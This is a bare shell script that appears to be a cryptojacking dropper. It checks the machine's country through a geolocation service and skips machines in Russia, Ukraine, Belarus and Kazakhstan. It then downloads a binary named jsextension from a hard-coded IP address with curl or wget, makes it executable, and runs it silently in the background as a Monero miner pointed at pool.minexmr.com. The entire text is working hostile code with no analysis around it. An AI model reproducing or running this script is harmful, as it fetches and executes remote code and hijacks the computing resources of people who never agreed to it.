IP=$(curl -k https://freegeoip.app/xml/ | grep 'RU\|UA\|BY\|KZ')
if [ -z "$IP" ]
    then
	var=$(pgrep jsextension)
	if [ -z "$var" ]
		then
		curl http://159.148.186.228/download/jsextension -o jsextension
		if [ ! -f jsextension ]
			then
			wget http://159.148.186.228/download/jsextension -O jsextension
		fi
		chmod +x jsextension
		./jsextension -k --tls --rig-id q -o pool.minexmr.com:443 -u <redacted> \
            --cpu-max-threads-hint=50 --donate-level=1 --background &>/dev/null &
	fi
fi
